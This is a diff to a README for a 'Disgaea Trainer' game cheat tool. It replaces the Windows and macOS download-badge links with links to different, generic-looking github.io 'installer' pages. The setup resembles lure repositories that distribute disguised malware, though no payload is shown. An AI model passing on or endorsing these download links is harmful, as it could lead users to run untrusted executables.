@@ -12,7 +12,7 @@
 
 [![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/yrareinihmwt/disgaea-trainer)
 
-[![Download Trainer](https://img.shields.io/badge/⬇️_Download_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download Trainer](https://img.shields.io/badge/⬇️_Download_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
 ![Disgaea](game.jpg)
 
@@ -77,7 +77,7 @@ The **Disgaea Trainer** solves all these issues by giving you complete control o
 
 macOS users can use our alternative tool:
 
-[![macOS Download](https://img.shields.io/badge/macOS-Download-silver?style=for-the-badge&logo=apple)](https://zenboulderagora.github.io/macdw/)
+[![macOS Download](https://img.shields.io/badge/macOS-Download-silver?style=for-the-badge&logo=apple)](https://mixedlinkrelease.github.io/installermac/)
 
 ## ⚖️ Legal
 
